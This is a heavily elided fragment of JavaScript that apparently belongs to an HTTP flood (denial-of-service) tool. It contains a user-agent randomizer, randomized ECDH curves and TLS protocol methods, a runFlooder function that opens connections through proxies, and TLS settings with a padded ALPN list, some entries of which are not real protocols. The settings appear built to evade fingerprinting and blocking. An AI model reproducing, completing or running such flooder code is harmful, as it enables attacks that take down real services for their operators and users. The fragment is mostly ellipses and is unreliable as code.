...
function getRandomUserAgent() {
 ...
 const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "prime256v1:X25519", "GREASE:X25519:x25519:P-256:P-384:P-521:X448"];
...
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 ...
 const secureProtocol = ["TLS_client_method", "TLS_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"];
 const headers = {};
 ...
 function runFlooder() {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         const tlsOptions = {
            ...
            secure: true,
            ALPNProtocols: [
                "h2", "http/1.1", "spdy/3.1", "http/1.2", "http/2", "http/2+quic/43", "http/2+quic/44", "h3"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
